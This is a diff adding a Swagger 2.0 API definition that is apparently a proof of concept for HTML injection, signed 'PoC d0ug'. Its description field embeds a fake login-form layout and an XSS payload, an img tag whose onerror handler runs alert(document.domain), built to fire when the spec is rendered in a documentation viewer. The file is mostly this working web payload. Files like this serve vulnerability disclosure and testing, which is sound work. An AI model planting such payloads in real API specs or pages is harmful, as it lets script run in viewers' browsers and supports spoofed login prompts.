@@ -1,0 +1,18 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: HTML Injection
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection:</h1> (PoC d0ug)
+    </div>
+    <div class="form-container">
+        <img src=x onerror="alert(document.domain)">
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
